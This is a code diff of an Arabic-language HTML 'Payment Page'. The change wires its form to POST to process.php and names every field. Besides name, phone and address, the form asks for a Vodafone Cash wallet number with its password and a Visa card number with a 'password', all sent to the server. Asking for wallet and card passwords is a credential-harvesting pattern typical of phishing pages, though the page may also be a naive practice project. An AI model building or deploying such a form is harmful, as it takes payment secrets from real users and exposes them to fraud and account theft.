@@ -11,52 +11,64 @@
 
 <body>
     <h1 class="title">Payment Page</h1>
-    <form id="paymentForm">
-        <input type="text" id="name" placeholder="الاسم" required>
-        <input type="text" id="phone" placeholder="رقم الهاتف" required>
-        <input type="text" id="address" placeholder="العنوان" required>
+    <form id="paymentForm" action="process.php" method="POST">
+    
+        <input type="hidden" name="form_type" value="payment">
+    
+        <input type="text" name="name" id="name" placeholder="الاسم" required>
+        <input type="text" name="phone" id="phone" placeholder="رقم الهاتف" required>
+        <input type="text" name="address" id="address" placeholder="العنوان" required>
+    
         <h3>اختار طريقة الدفع</h3>
+    
         <!-- Vodafone -->
         <label class="payment-option">
-            <input type="radio" name="payment" value="vodafone" onclick="showMethod('vodafone')">
+            <input type="radio" name="payment" value="vodafone" onclick="showMethod('vodafone')" required>
             <span class="custom-radio"></span>
             <div class="option-content">
                 <img src="./photo/images.png">
                 <span>فودافون كاش</span>
             </div>
         </label>
+    
         <div id="vodafoneBox" class="method-box">
-            <input type="text" placeholder="رقم المحفظة">
-            <input type="password" placeholder="كلمة المرور">
+            <input type="text" name="vodafone_wallet" placeholder="رقم المحفظة">
+            <input type="password" name="vodafone_pass" placeholder="كلمة المرور">
         </div>
+    
         <!-- Visa -->
         <label class="payment-option">
-            <input type="radio" name="payment" value="visa" onclick="showMethod('visa')">
+            <input type="radio" name="payment" value="visa" onclick="showMethod('visa')" required>
             <span class="custom-radio"></span>
             <div class="option-content">
                 <img src="./photo/1c58492c218f6.jpg">
                 <span>فيزا</span>
             </div>
         </label>
+    
         <div id="visaBox" class="method-box">
-            <input type="text" placeholder="رقم الكارت">
-            <input type="password" placeholder="كلمة المرور">
+            <input type="text" name="visa_card" placeholder="رقم الكارت">
+            <input type="password" name="visa_pass" placeholder="كلمة المرور">
         </div>
+    
         <!-- COD -->
         <label class="payment-option">
-            <input type="radio" name="payment" value="cod" onclick="showMethod('cod')">
+            <input type="radio" name="payment" value="cod" onclick="showMethod('cod')" required>
             <span class="custom-radio"></span>
             <div class="option-content">
                 <i class="fa-solid fa-hand"></i>
                 <span>الدفع عند الاستلام</span>
             </div>
         </label>
+    
         <div id="codBox" class="method-box">
             <p>لن تحتاج إدخال بيانات إضافية</p>
         </div>
+    
         <button type="submit">تأكيد الطلب</button>
+    
     </form>
     
-    <div id="successMsg">✔ تم تأكيد الأوردر بنجاح</div>
+    <div id="successMsg" style="display:none;">✔ تم تأكيد الأوردر بنجاح</div>
 </body>
 </html>
